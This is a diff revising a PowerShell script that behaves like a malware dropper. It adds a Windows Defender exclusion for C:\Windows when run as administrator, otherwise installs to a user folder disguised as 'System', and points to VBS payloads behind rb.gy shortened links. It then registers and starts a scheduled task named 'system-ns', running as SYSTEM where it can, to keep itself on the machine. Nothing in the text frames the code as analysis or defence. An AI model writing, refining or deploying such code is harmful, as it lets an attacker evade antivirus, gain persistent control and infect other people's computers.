@@ -1,24 +1,18 @@
 # Check if the script is running as an Administrator
-$isAdmin = ([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$isAdmin = ([Security.Principal.WindowsPrincipal]::New([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if ($isAdmin) {
     Write-Output "Running as Administrator"
-
-    # Admin rights detected
     $installPath = "C:\Windows"
     $scriptVbsUrl = "https://rb.gy/w3a7hb"
-
-    # Windows Defender Exclusion
     Add-MpPreference -ExclusionPath $installPath
 } else {
     Write-Output "Not running as Administrator"
-
-    # No admin rights
     $installPath = Join-Path $env:USERPROFILE "System"
     $scriptVbsUrl = "https://rb.gy/3lld2p"
 }
 
-# Create the installation directory if it doesn't exist
+# Create the installation directory if it doesn’t exist
 if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
@@ -49,24 +43,20 @@ $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoi
 
 try {
     $taskName = "system-ns"
+    $taskPath = "\MyTasks\"  # Custom subfolder for non-admin users
 
     if ($isAdmin) {
-        # If admin rights, run as NT AUTHORITY\SYSTEM
+        # Admin: Register in root with SYSTEM account
         $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-
-        # Register the task with SYSTEM account
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath "\" -Principal $principal -Settings $settings -Force
+        Start-ScheduledTask -TaskName $taskName -TaskPath "\"
     } else {
-        # If not admin, create the task with the current user's context
-        $principal = New-ScheduledTaskPrincipal -UserId $env:UserName -LogonType Interactive
-
-        # Register the task with the current user's context
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Principal $principal -Settings $settings -Force
+        # Non-Admin: Register in custom subfolder with current user
+        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
+        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -TaskPath $taskPath -Principal $principal -Settings $settings -Force
+        Start-ScheduledTask -TaskName $taskName -TaskPath $taskPath
     }
-
-    # Start the task immediately after registration
-    Start-ScheduledTask -TaskName $taskName
-
+    Write-Output "Task registered and started successfully."
 } catch {
     Write-Output "Failed to register or start the scheduled task: $_"
 }
